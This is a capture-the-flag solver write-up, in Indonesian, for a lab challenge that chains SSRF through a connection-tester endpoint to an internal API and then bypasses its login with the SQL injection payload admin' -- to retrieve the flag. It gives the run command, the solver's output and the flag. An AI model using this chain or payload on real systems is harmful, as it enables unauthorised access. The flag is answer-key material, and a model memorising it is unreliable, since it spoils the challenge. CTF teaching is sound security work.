# Solver: I'm inside of inside of inside

Write-up dan panduan eksploitasi resmi untuk challenge **I'm inside of inside of inside**.

## Ringkasan Kerentanan

- **Kerentanan 1 (SSRF):** Endpoint `POST /api/check` pada aplikasi publik RelayDesk bertindak sebagai proxy HTTP tanpa pembatasan domain internal atau host privat.
- **Kerentanan 2 (SQL Injection):** Endpoint internal `POST /staff/session` pada layanan `archive-api.svc.local:8081` menyusun query autentikasi dengan interpolasi string langsung tanpa parameterized query.
- **Rantai Eksploitasi:**
  1. Reconnaissance informasi internal via `/status` (alias: `archive-api`) dan `/help/networking` (domain: `*.svc.local`, port: `8081`).
  2. Mengakses service internal melalui fitur Connection Tester (`POST /api/check`).
  3. Membaca dokumentasi API internal di `/docs`.
  4. Melakukan bypass login admin via SQL Injection (`admin' -- `) untuk memperoleh bearer token admin.
  5. Mengambil flag dari `/staff/audit` menggunakan bearer token tersebut.

## Prasyarat Solver

- Python 3.8+
- Library `requests`:
  ```bash
  pip install requests
  ```

## Cara Menjalankan

Jalankan script solver dengan menyertakan URL target:

```bash
python solve.py http://localhost:8082
```

## Hasil Eksekusi

```text
[*] Targeting RelayDesk instance at: http://localhost:8082
[*] Step 1: Gathering network topology clues from status and help endpoints...
[+] Deduced internal archive target: http://archive-api.svc.local:8081
[*] Step 2: Validating SSRF connection to internal root index...
[+] Internal root index response: {"documentation":"/docs","message":"Staff access required for audit records.","service":"Archive API","version":"1.2"}
[*] Step 3: Retrieving internal API documentation from /docs...
[+] Internal docs retrieved. Endpoints discovered: /staff/session, /staff/audit
[*] Step 4: Exploiting SQL injection on /staff/session to establish admin session...
[+] Admin session token obtained: e38f...
[*] Step 5: Fetching audit logs containing flag via SSRF...

==================================================
[+] FLAG RECOVERED: TecFest26{wh3n_yhH_b1s4_d1_d4l3m_h4t1_ny4_d14}
==================================================
[+] Flag format verified successfully!
```
